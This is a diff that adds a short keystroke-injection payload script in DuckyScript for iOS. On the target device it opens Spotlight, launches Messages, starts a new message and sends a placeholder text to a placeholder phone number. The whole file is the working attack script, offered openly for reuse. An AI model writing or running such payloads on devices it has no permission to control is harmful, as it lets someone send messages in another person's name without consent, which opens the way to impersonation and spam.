@@ -1,0 +1,25 @@
+REM Version 1.0
+REM OS: iOS
+REM Author: Peaakss
+REM Description: A simple payload that sens a text message through iOS Messager
+REM NOTICE change text inside strings with "" to desried text | EXAMPLE | STRING 111-111-111
+
+GUI h
+DELAY 100
+GUI SPACE 
+DELAY 50
+BACKSPACE
+DELAY 50
+STRING Messages
+DELAY 250
+ENTER
+DELAY 100
+GUI n 
+DELAY 100
+STRING "PHONE NUMBER"
+DELAY 100
+TAB
+DELAY 100
+STRING "MESSAGE"
+DELAY 150
+ENTER
